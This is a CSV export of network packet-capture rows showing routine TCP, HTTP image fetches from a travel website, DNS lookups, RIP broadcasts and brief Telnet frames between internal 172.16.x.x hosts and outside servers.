"R"," R", "403155","12:10:10.674229","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403156","12:10:10.675469","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403157","12:10:10.676700","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403158","12:10:10.677112","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [ACK] Seq=151 Ack=13141 Win=30660 Len=0"
"R"," R", "403159","12:10:10.683001","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403160","12:10:10.684228","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403161","12:10:10.685466","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403162","12:10:10.686702","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403163","12:10:10.687934","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403164","12:10:10.688011","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [ACK] Seq=151 Ack=18981 Win=30660 Len=0"
"R"," R", "403165","12:10:10.692741","208.209.46.37","172.16.116.194","TCP","765","[TCP segment of a reassembled PDU]"
"R"," R", "403166","12:10:10.692801","208.209.46.37","172.16.116.194","HTTP","60","HTTP/1.1 200 OK  (text/html)"
"R"," R", "403167","12:10:10.692938","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [ACK] Seq=151 Ack=21153 Win=30660 Len=0"
"R"," R", "403168","12:10:10.693832","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [FIN, ACK] Seq=151 Ack=21153 Win=32120 Len=0"
"R"," R", "403169","12:10:10.697211","208.209.46.37","172.16.116.194","TCP","60","80 → 7272 [ACK] Seq=21153 Ack=152 Win=32735 Len=0"
"R"," R", "403170","12:10:10.978100","172.16.113.84","195.73.151.50","TELNET","60","Telnet Data ..."
"R"," R", "403171","12:10:10.979531","195.73.151.50","172.16.113.84","TELNET","96","Telnet Data ..."
"R"," R", "403172","12:10:10.997027","172.16.113.84","195.73.151.50","TCP","60","18467 → 23 [ACK] Seq=747 Ack=17275 Win=32120 Len=0"
"R"," R", "403173","12:10:11.187709","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "403174","12:10:11.187883","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "403175","12:10:11.944270","172.16.112.20","192.168.1.20","DNS","90","Standard query 0x2cd1 A destinations.previewtravel.com"
"R"," R", "403176","12:10:11.948805","192.168.1.20","172.16.112.20","DNS","150","Standard query response 0x2cd1 A destinations.previewtravel.com A 198.68.244.168 NS aesop.world.net A 192.168.1.20"
"R"," R", "403177","12:10:11.950202","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403178","12:10:11.955659","198.68.244.168","172.16.112.207","TCP","60","80 → 7273 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403179","12:10:11.955836","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403180","12:10:11.956283","172.16.112.207","198.68.244.168","HTTP","230","GET / HTTP/1.0 "
"R"," R", "403181","12:10:11.974044","198.68.244.168","172.16.112.207","TCP","60","80 → 7273 [ACK] Seq=1 Ack=177 Win=32736 Len=0"
"R"," R", "403182","12:10:12.005005","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403183","12:10:12.006234","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403184","12:10:12.006817","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [ACK] Seq=177 Ack=2921 Win=32120 Len=0"
"R"," R", "403185","12:10:12.011169","172.16.112.100","207.217.78.131","TCP","60","1967 → 80 [FIN, ACK] Seq=347 Ack=875 Win=7887 Len=0"
"R"," R", "403186","12:10:12.012514","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403187","12:10:12.013764","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403188","12:10:12.015036","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403189","12:10:12.016485","207.217.78.131","172.16.112.100","TCP","60","80 → 1967 [ACK] Seq=875 Ack=348 Win=32735 Len=0"
"R"," R", "403190","12:10:12.016823","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [ACK] Seq=177 Ack=7301 Win=32120 Len=0"
"R"," R", "403191","12:10:12.022342","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403192","12:10:12.023561","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403193","12:10:12.024791","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403194","12:10:12.026023","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403195","12:10:12.026814","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [ACK] Seq=177 Ack=13141 Win=32120 Len=0"
"R"," R", "403196","12:10:12.032331","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403197","12:10:12.033576","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403198","12:10:12.034807","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403199","12:10:12.035033","198.68.244.168","172.16.112.207","TCP","256","[TCP segment of a reassembled PDU]"
"R"," R", "403200","12:10:12.035103","198.68.244.168","172.16.112.207","HTTP","60","HTTP/1.1 200 OK  (text/html)"
"R"," R", "403201","12:10:12.035246","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [ACK] Seq=177 Ack=17724 Win=30660 Len=0"
"R"," R", "403202","12:10:12.036045","172.16.112.207","198.68.244.168","TCP","60","7273 → 80 [FIN, ACK] Seq=177 Ack=17724 Win=32120 Len=0"
"R"," R", "403203","12:10:12.038717","198.68.244.168","172.16.112.207","TCP","60","80 → 7273 [ACK] Seq=17724 Ack=178 Win=32735 Len=0"
"R"," R", "403204","12:10:12.142301","172.16.112.207","209.157.21.40","TCP","60","6257 → 80 [FIN, ACK] Seq=243 Ack=258 Win=32120 Len=0"
"R"," R", "403205","12:10:12.142643","172.16.112.207","198.68.244.168","TCP","60","7275 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403206","12:10:12.146201","209.157.21.40","172.16.112.207","TCP","60","80 → 6257 [ACK] Seq=258 Ack=244 Win=32735 Len=0"
"R"," R", "403207","12:10:12.146893","198.68.244.168","172.16.112.207","TCP","60","80 → 7275 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403208","12:10:12.147046","172.16.112.207","198.68.244.168","TCP","60","7275 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403209","12:10:12.147594","172.16.112.207","198.68.244.168","HTTP","308","GET /Images-home/listbox_left2.gif HTTP/1.0 "
"R"," R", "403210","12:10:12.164767","198.68.244.168","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403211","12:10:12.165210","198.68.244.168","172.16.112.207","HTTP","529","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403212","12:10:12.165282","198.68.244.168","172.16.112.207","TCP","60","80 → 7275 [FIN, ACK] Seq=1500 Ack=255 Win=32736 Len=0"
"R"," R", "403213","12:10:12.165419","172.16.112.207","198.68.244.168","TCP","60","7275 → 80 [ACK] Seq=255 Ack=1501 Win=30660 Len=0"
"R"," R", "403214","12:10:12.166271","172.16.112.207","198.68.244.168","TCP","60","7275 → 80 [FIN, ACK] Seq=255 Ack=1501 Win=32120 Len=0"
"R"," R", "403215","12:10:12.168665","172.16.112.207","198.68.244.168","TCP","60","7276 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403216","12:10:12.169171","198.68.244.168","172.16.112.207","TCP","60","80 → 7275 [ACK] Seq=1501 Ack=256 Win=32735 Len=0"
"R"," R", "403217","12:10:12.171950","198.68.244.168","172.16.112.207","TCP","60","80 → 7276 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403218","12:10:12.172091","172.16.112.207","198.68.244.168","TCP","60","7276 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403219","12:10:12.172551","172.16.112.207","198.68.244.168","HTTP","313","GET /Images-home/video_gallery_icon.gif HTTP/1.0 "
"R"," R", "403220","12:10:12.188403","198.68.244.168","172.16.112.207","HTTP","790","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403221","12:10:12.188465","198.68.244.168","172.16.112.207","TCP","60","80 → 7276 [FIN, ACK] Seq=737 Ack=260 Win=32736 Len=0"
"R"," R", "403222","12:10:12.188617","172.16.112.207","198.68.244.168","TCP","60","7276 → 80 [ACK] Seq=260 Ack=738 Win=31383 Len=0"
"R"," R", "403223","12:10:12.189566","172.16.112.207","198.68.244.168","TCP","60","7276 → 80 [FIN, ACK] Seq=260 Ack=738 Win=32120 Len=0"
"R"," R", "403224","12:10:12.191938","172.16.112.207","198.68.244.168","TCP","60","7329 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403225","12:10:12.192445","198.68.244.168","172.16.112.207","TCP","60","80 → 7276 [ACK] Seq=738 Ack=261 Win=32735 Len=0"
"R"," R", "403226","12:10:12.195172","198.68.244.168","172.16.112.207","TCP","60","80 → 7329 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403227","12:10:12.195311","172.16.112.207","198.68.244.168","TCP","60","7329 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403228","12:10:12.195765","172.16.112.207","198.68.244.168","HTTP","320","GET /Images/Headers/header_lg_destinations.gif HTTP/1.0 "
"R"," R", "403229","12:10:12.213984","198.68.244.168","172.16.112.207","TCP","60","80 → 7329 [ACK] Seq=1 Ack=267 Win=32736 Len=0"
"R"," R", "403230","12:10:12.255346","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403231","12:10:12.256293","198.68.244.168","172.16.112.207","HTTP","1158","HTTP/1.1 200 OK  (GIF87a)"
"R"," R", "403232","12:10:12.256362","198.68.244.168","172.16.112.207","TCP","60","80 → 7329 [FIN, ACK] Seq=2565 Ack=267 Win=32736 Len=0"
"R"," R", "403233","12:10:12.256522","172.16.112.207","198.68.244.168","TCP","60","7329 → 80 [ACK] Seq=267 Ack=2566 Win=30660 Len=0"
"R"," R", "403234","12:10:12.257547","172.16.112.207","198.68.244.168","TCP","60","7329 → 80 [FIN, ACK] Seq=267 Ack=2566 Win=32120 Len=0"
"R"," R", "403235","12:10:12.259370","172.16.112.20","192.168.1.20","DNS","81","Standard query 0x2cd2 A www.previewtravel.com"
"R"," R", "403236","12:10:12.260197","198.68.244.168","172.16.112.207","TCP","60","80 → 7329 [ACK] Seq=2566 Ack=268 Win=32735 Len=0"
"R"," R", "403237","12:10:12.264067","192.168.1.20","172.16.112.20","DNS","141","Standard query response 0x2cd2 A www.previewtravel.com A 198.68.244.158 NS aesop.world.net A 192.168.1.20"
"R"," R", "403238","12:10:12.265264","172.16.112.207","198.68.244.158","TCP","60","7333 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403239","12:10:12.268798","198.68.244.158","172.16.112.207","TCP","60","80 → 7333 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403240","12:10:12.268951","172.16.112.207","198.68.244.158","TCP","60","7333 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403241","12:10:12.269392","172.16.112.207","198.68.244.158","HTTP","304","GET /Images/mastercard_logo_outline.gif HTTP/1.0 "
"R"," R", "403242","12:10:12.283972","198.68.244.158","172.16.112.207","TCP","60","80 → 7333 [ACK] Seq=1 Ack=251 Win=32736 Len=0"
"R"," R", "403243","12:10:12.307476","198.68.244.158","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403244","12:10:12.308132","198.68.244.158","172.16.112.207","HTTP","796","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403245","12:10:12.308204","198.68.244.158","172.16.112.207","TCP","60","80 → 7333 [FIN, ACK] Seq=2203 Ack=251 Win=32736 Len=0"
"R"," R", "403246","12:10:12.308350","172.16.112.207","198.68.244.158","TCP","60","7333 → 80 [ACK] Seq=251 Ack=2204 Win=30660 Len=0"
"R"," R", "403247","12:10:12.309410","172.16.112.207","198.68.244.158","TCP","60","7333 → 80 [FIN, ACK] Seq=251 Ack=2204 Win=32120 Len=0"
"R"," R", "403248","12:10:12.311967","198.68.244.158","172.16.112.207","TCP","60","80 → 7333 [ACK] Seq=2204 Ack=252 Win=32735 Len=0"
"R"," R", "403249","12:10:12.312212","172.16.112.207","198.68.244.158","TCP","60","7334 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403250","12:10:12.314894","198.68.244.158","172.16.112.207","TCP","60","80 → 7334 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403251","12:10:12.315041","172.16.112.207","198.68.244.158","TCP","60","7334 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403252","12:10:12.315486","172.16.112.207","198.68.244.158","HTTP","300","GET /Images/125x48_PtValentines.gif HTTP/1.0 "
"R"," R", "403253","12:10:12.333173","198.68.244.158","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403254","12:10:12.333734","198.68.244.158","172.16.112.207","HTTP","680","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403255","12:10:12.333803","198.68.244.158","172.16.112.207","TCP","60","80 → 7334 [FIN, ACK] Seq=2087 Ack=247 Win=32736 Len=0"
"R"," R", "403256","12:10:12.333943","172.16.112.207","198.68.244.158","TCP","60","7334 → 80 [ACK] Seq=247 Ack=2088 Win=30660 Len=0"
"R"," R", "403257","12:10:12.335076","172.16.112.207","198.68.244.158","TCP","60","7334 → 80 [FIN, ACK] Seq=247 Ack=2088 Win=32120 Len=0"
"R"," R", "403258","12:10:12.337522","198.68.244.158","172.16.112.207","TCP","60","80 → 7334 [ACK] Seq=2088 Ack=248 Win=32735 Len=0"
"R"," R", "403259","12:10:12.337834","172.16.112.207","198.68.244.168","TCP","60","7398 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403260","12:10:12.340455","198.68.244.168","172.16.112.207","TCP","60","80 → 7398 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403261","12:10:12.340597","172.16.112.207","198.68.244.168","TCP","60","7398 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403262","12:10:12.341037","172.16.112.207","198.68.244.168","HTTP","303","GET /Images-home/bnb_icon.gif HTTP/1.0 "
"R"," R", "403263","12:10:12.354000","198.68.244.168","172.16.112.207","TCP","60","80 → 7398 [ACK] Seq=1 Ack=250 Win=32736 Len=0"
"R"," R", "403264","12:10:12.357307","198.68.244.168","172.16.112.207","HTTP","864","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403265","12:10:12.357375","198.68.244.168","172.16.112.207","TCP","60","80 → 7398 [FIN, ACK] Seq=811 Ack=250 Win=32736 Len=0"
"R"," R", "403266","12:10:12.357513","172.16.112.207","198.68.244.168","TCP","60","7398 → 80 [ACK] Seq=250 Ack=812 Win=31309 Len=0"
"R"," R", "403267","12:10:12.358856","172.16.112.207","198.68.244.168","TCP","60","7398 → 80 [FIN, ACK] Seq=250 Ack=812 Win=32120 Len=0"
"R"," R", "403268","12:10:12.361178","198.68.244.168","172.16.112.207","TCP","60","80 → 7398 [ACK] Seq=812 Ack=251 Win=32735 Len=0"
"R"," R", "403269","12:10:12.361662","172.16.112.207","198.68.244.168","TCP","60","7461 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403270","12:10:12.364106","198.68.244.168","172.16.112.207","TCP","60","80 → 7461 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403271","12:10:12.364252","172.16.112.207","198.68.244.168","TCP","60","7461 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403272","12:10:12.364697","172.16.112.207","198.68.244.168","HTTP","309","GET /Images-home/postcards_icon.gif HTTP/1.0 "
"R"," R", "403273","12:10:12.383940","198.68.244.168","172.16.112.207","TCP","60","80 → 7461 [ACK] Seq=1 Ack=256 Win=32736 Len=0"
"R"," R", "403274","12:10:12.394192","198.68.244.168","172.16.112.207","HTTP","819","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403275","12:10:12.394262","198.68.244.168","172.16.112.207","TCP","60","80 → 7461 [FIN, ACK] Seq=766 Ack=256 Win=32736 Len=0"
"R"," R", "403276","12:10:12.394399","172.16.112.207","198.68.244.168","TCP","60","7461 → 80 [ACK] Seq=256 Ack=767 Win=31354 Len=0"
"R"," R", "403277","12:10:12.395864","172.16.112.207","198.68.244.168","TCP","60","7461 → 80 [FIN, ACK] Seq=256 Ack=767 Win=32120 Len=0"
"R"," R", "403278","12:10:12.398049","198.68.244.168","172.16.112.207","TCP","60","80 → 7461 [ACK] Seq=767 Ack=257 Win=32735 Len=0"
"R"," R", "403279","12:10:12.399015","172.16.112.207","198.68.244.168","TCP","60","7462 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403280","12:10:12.400963","198.68.244.168","172.16.112.207","TCP","60","80 → 7462 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403281","12:10:12.401115","172.16.112.207","198.68.244.168","TCP","60","7462 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403282","12:10:12.401567","172.16.112.207","198.68.244.168","HTTP","301","GET /Images/Headers/end.gif HTTP/1.0 "
"R"," R", "403283","12:10:12.413993","198.68.244.168","172.16.112.207","TCP","60","80 → 7462 [ACK] Seq=1 Ack=248 Win=32736 Len=0"
"R"," R", "403284","12:10:12.416980","198.68.244.168","172.16.112.207","HTTP","528","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403285","12:10:12.417049","198.68.244.168","172.16.112.207","TCP","60","80 → 7462 [FIN, ACK] Seq=475 Ack=248 Win=32736 Len=0"
"R"," R", "403286","12:10:12.417188","172.16.112.207","198.68.244.168","TCP","60","7462 → 80 [ACK] Seq=248 Ack=476 Win=31645 Len=0"
"R"," R", "403287","12:10:12.418616","172.16.112.207","198.68.244.168","TCP","60","7462 → 80 [FIN, ACK] Seq=248 Ack=476 Win=32120 Len=0"
"R"," R", "403288","12:10:12.420755","198.68.244.168","172.16.112.207","TCP","60","80 → 7462 [ACK] Seq=476 Ack=249 Win=32735 Len=0"
"R"," R", "403289","12:10:12.421614","172.16.112.207","198.68.244.168","TCP","60","7463 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403290","12:10:12.423699","198.68.244.168","172.16.112.207","TCP","60","80 → 7463 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403291","12:10:12.423848","172.16.112.207","198.68.244.168","TCP","60","7463 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403292","12:10:12.424297","172.16.112.207","198.68.244.168","HTTP","311","GET /Images-home/rest_finder_icon.gif HTTP/1.0 "
"R"," R", "403293","12:10:12.440152","198.68.244.168","172.16.112.207","HTTP","793","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403294","12:10:12.440218","198.68.244.168","172.16.112.207","TCP","60","80 → 7463 [FIN, ACK] Seq=740 Ack=258 Win=32736 Len=0"
"R"," R", "403295","12:10:12.440366","172.16.112.207","198.68.244.168","TCP","60","7463 → 80 [ACK] Seq=258 Ack=741 Win=31380 Len=0"
"R"," R", "403296","12:10:12.441936","172.16.112.207","198.68.244.168","TCP","60","7463 → 80 [FIN, ACK] Seq=258 Ack=741 Win=32120 Len=0"
"R"," R", "403297","12:10:12.444006","198.68.244.168","172.16.112.207","TCP","60","80 → 7463 [ACK] Seq=741 Ack=259 Win=32735 Len=0"
"R"," R", "403298","12:10:12.444988","172.16.112.207","198.68.244.168","TCP","60","7465 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403299","12:10:12.446947","198.68.244.168","172.16.112.207","TCP","60","80 → 7465 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403300","12:10:12.447096","172.16.112.207","198.68.244.168","TCP","60","7465 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403301","12:10:12.447536","172.16.112.207","198.68.244.168","HTTP","305","GET /Images-home/map_center.gif HTTP/1.0 "
"R"," R", "403302","12:10:12.463926","198.68.244.168","172.16.112.207","TCP","60","80 → 7465 [ACK] Seq=1 Ack=252 Win=32736 Len=0"
"R"," R", "403303","12:10:12.479119","198.68.244.168","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403304","12:10:12.479200","198.68.244.168","172.16.112.207","HTTP","76","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403305","12:10:12.479270","198.68.244.168","172.16.112.207","TCP","60","80 → 7465 [FIN, ACK] Seq=1047 Ack=252 Win=32736 Len=0"
"R"," R", "403306","12:10:12.479432","172.16.112.207","198.68.244.168","TCP","60","7465 → 80 [ACK] Seq=252 Ack=1048 Win=32120 Len=0"
"R"," R", "403307","12:10:12.481120","172.16.112.207","198.68.244.168","TCP","60","7465 → 80 [FIN, ACK] Seq=252 Ack=1048 Win=32120 Len=0"
"R"," R", "403308","12:10:12.483056","198.68.244.168","172.16.112.207","TCP","60","80 → 7465 [ACK] Seq=1048 Ack=253 Win=32735 Len=0"
"R"," R", "403309","12:10:12.484268","172.16.112.207","198.68.244.168","TCP","60","7466 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403310","12:10:12.486004","198.68.244.168","172.16.112.207","TCP","60","80 → 7466 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403311","12:10:12.486161","172.16.112.207","198.68.244.168","TCP","60","7466 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403312","12:10:12.486601","172.16.112.207","198.68.244.168","HTTP","310","GET /Images-home/break_resources.gif HTTP/1.0 "
"R"," R", "403313","12:10:12.502685","198.68.244.168","172.16.112.207","HTTP","878","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403314","12:10:12.502753","198.68.244.168","172.16.112.207","TCP","60","80 → 7466 [FIN, ACK] Seq=825 Ack=257 Win=32736 Len=0"
"R"," R", "403315","12:10:12.502908","172.16.112.207","198.68.244.168","TCP","60","7466 → 80 [ACK] Seq=257 Ack=826 Win=31295 Len=0"
"R"," R", "403316","12:10:12.504728","172.16.112.207","198.68.244.168","TCP","60","7466 → 80 [FIN, ACK] Seq=257 Ack=826 Win=32120 Len=0"
"R"," R", "403317","12:10:12.506559","198.68.244.168","172.16.112.207","TCP","60","80 → 7466 [ACK] Seq=826 Ack=258 Win=32735 Len=0"
"R"," R", "403318","12:10:12.508040","172.16.112.207","198.68.244.168","TCP","60","7467 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403319","12:10:12.509516","198.68.244.168","172.16.112.207","TCP","60","80 → 7467 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403320","12:10:12.509669","172.16.112.207","198.68.244.168","TCP","60","7467 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
